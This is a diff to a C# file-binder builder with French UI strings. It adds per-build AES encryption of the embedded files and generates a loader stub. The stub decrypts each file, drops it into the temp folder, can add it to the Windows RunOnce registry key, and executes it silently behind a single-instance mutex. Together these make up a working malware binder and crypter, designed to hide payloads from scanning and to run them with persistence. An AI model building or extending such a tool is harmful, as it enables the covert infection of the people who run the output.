@@ -49,9 +49,14 @@ public static class BinderBuilder
         Directory.CreateDirectory(tmp);
         try
         {
-            progress("Copie des fichiers…");
+            progress("Chiffrement des fichiers…");
 
-            // Sanitize & deduplicate names
+            // Random AES-128 key + unique mutex per build
+            var aesKey    = new byte[16];
+            System.Security.Cryptography.RandomNumberGenerator.Fill(aesKey);
+            var mutexName = Guid.NewGuid().ToString("N");
+
+            // Sanitize & deduplicate names, then AES-encrypt before embedding
             var fileNames = new List<string>();
             for (int i = 0; i < entries.Count; i++)
             {
@@ -59,12 +64,13 @@ public static class BinderBuilder
                 if (fileNames.Contains(name, StringComparer.OrdinalIgnoreCase))
                     name = $"{i}_{name}";
                 fileNames.Add(name);
-                File.Copy(entries[i].FilePath, Path.Combine(tmp, name), overwrite: true);
+                var plain = File.ReadAllBytes(entries[i].FilePath);
+                File.WriteAllBytes(Path.Combine(tmp, name), AesEncrypt(plain, aesKey));
             }
 
             // Generate loader source
             progress("Génération du code…");
-            File.WriteAllText(Path.Combine(tmp, "Program.cs"), GenerateCode(entries, fileNames), Encoding.UTF8);
+            File.WriteAllText(Path.Combine(tmp, "Program.cs"), GenerateCode(entries, fileNames, aesKey, mutexName), Encoding.UTF8);
 
             // Build /resource arguments
             var resources = new StringBuilder();
@@ -115,41 +121,68 @@ public static class BinderBuilder
 
     // ── Code generation ─────────────────────────────────────────────────
 
-    private static string GenerateCode(IList<BinderEntry> entries, IList<string> fileNames)
+    private static string GenerateCode(IList<BinderEntry> entries, IList<string> fileNames, byte[] aesKey, string mutexName)
     {
         bool anyRunOnce = entries.Any(e => e.RunOnce);
+        var keyLiteral  = string.Join(",", aesKey.Select(b => b.ToString()));
         var sb = new StringBuilder();
         sb.AppendLine("using System;");
         sb.AppendLine("using System.IO;");
         sb.AppendLine("using System.Reflection;");
         sb.AppendLine("using System.Runtime.InteropServices;");
+        sb.AppendLine("using System.Security.Cryptography;");
+        sb.AppendLine("using System.Threading;");
         if (anyRunOnce) sb.AppendLine("using Microsoft.Win32;");
         sb.AppendLine("class B {");
-        sb.AppendLine("    [DllImport(\"shell32.dll\")]static extern int ShellExecute(IntPtr h,string op,string f,string par,string dir,int show);");
+        sb.AppendLine("    [DllImport(\"shell32.dll\")] static extern int ShellExecute(IntPtr h,string op,string f,string par,string dir,int show);");
+        sb.AppendLine($"    static readonly byte[] K = new byte[]{{{keyLiteral}}};");
+        sb.AppendLine($"    static readonly string M = \"{mutexName}\";");
         sb.AppendLine("    static void Main() {");
-        sb.AppendLine("        string t = Path.GetTempPath();");
-        sb.AppendLine("        Assembly a = Assembly.GetExecutingAssembly();");
+        sb.AppendLine("        bool ok;");
+        sb.AppendLine("        var mtx = new Mutex(false, M, out ok);");
+        sb.AppendLine("        if (!ok) { mtx.Dispose(); return; }");
+        sb.AppendLine("        try {");
+        sb.AppendLine("            string t = Path.GetTempPath();");
+        sb.AppendLine("            Assembly a = Assembly.GetExecutingAssembly();");
         for (int i = 0; i < entries.Count; i++)
         {
             var n  = fileNames[i].Replace("\\", "\\\\").Replace("\"", "\\\"");
             var ro = entries[i].RunOnce ? "true" : "false";
-            sb.AppendLine($"        Drop(a,t,\"{n}\",{ro});");
+            sb.AppendLine($"            Drop(a,t,\"{n}\",{ro});");
         }
+        sb.AppendLine("        } finally { mtx.Dispose(); }");
         sb.AppendLine("    }");
-        sb.AppendLine("    static void Drop(Assembly a,string t,string name,bool ro){");
-        sb.AppendLine("        try{");
-        sb.AppendLine("            Stream s=a.GetManifestResourceStream(name);");
-        sb.AppendLine("            if(s==null)return;");
-        sb.AppendLine("            var ms2=new MemoryStream();s.CopyTo(ms2);s.Dispose();byte[] b=ms2.ToArray();ms2.Dispose();");
-        sb.AppendLine("            string p=Path.Combine(t,name);");
-        sb.AppendLine("            File.WriteAllBytes(p,b);");
+        sb.AppendLine("    static byte[] Dec(byte[] d) {");
+        sb.AppendLine("        using (var aes = Aes.Create()) {");
+        sb.AppendLine("            aes.Key = K; aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.PKCS7;");
+        sb.AppendLine("            using (var dc = aes.CreateDecryptor()) return dc.TransformFinalBlock(d, 0, d.Length);");
+        sb.AppendLine("        }");
+        sb.AppendLine("    }");
+        sb.AppendLine("    static void Drop(Assembly a,string t,string name,bool ro) {");
+        sb.AppendLine("        try {");
+        sb.AppendLine("            var s = a.GetManifestResourceStream(name);");
+        sb.AppendLine("            if (s == null) return;");
+        sb.AppendLine("            var ms = new MemoryStream(); s.CopyTo(ms); s.Dispose();");
+        sb.AppendLine("            byte[] b = Dec(ms.ToArray()); ms.Dispose();");
+        sb.AppendLine("            string p = Path.Combine(t, name);");
+        sb.AppendLine("            File.WriteAllBytes(p, b);");
         if (anyRunOnce)
-            sb.AppendLine("            if(ro)try{var k=Registry.CurrentUser.CreateSubKey(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\",true);if(k!=null){k.SetValue(name,\"\\\"\" +p+ \"\\\"\");k.Dispose();}}catch{}");
-        sb.AppendLine("            ShellExecute(IntPtr.Zero,\"open\",p,null,null,1);");
-        sb.AppendLine("        }catch{}");
+            sb.AppendLine("            if (ro) try { var k=Registry.CurrentUser.CreateSubKey(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\",true); if(k!=null){k.SetValue(name,\"\\\"\" +p+ \"\\\"\");k.Dispose();} } catch {}");
+        sb.AppendLine("            ShellExecute(IntPtr.Zero, \"open\", p, null, null, 1);");
+        sb.AppendLine("        } catch {}");
         sb.AppendLine("    }");
         sb.AppendLine("}");
         return sb.ToString();
+    }
+
+    private static byte[] AesEncrypt(byte[] data, byte[] key)
+    {
+        using var aes = System.Security.Cryptography.Aes.Create();
+        aes.Key     = key;
+        aes.Mode    = System.Security.Cryptography.CipherMode.ECB;
+        aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
+        using var enc = aes.CreateEncryptor();
+        return enc.TransformFinalBlock(data, 0, data.Length);
     }
 
     // ── csc.exe discovery ───────────────────────────────────────────────
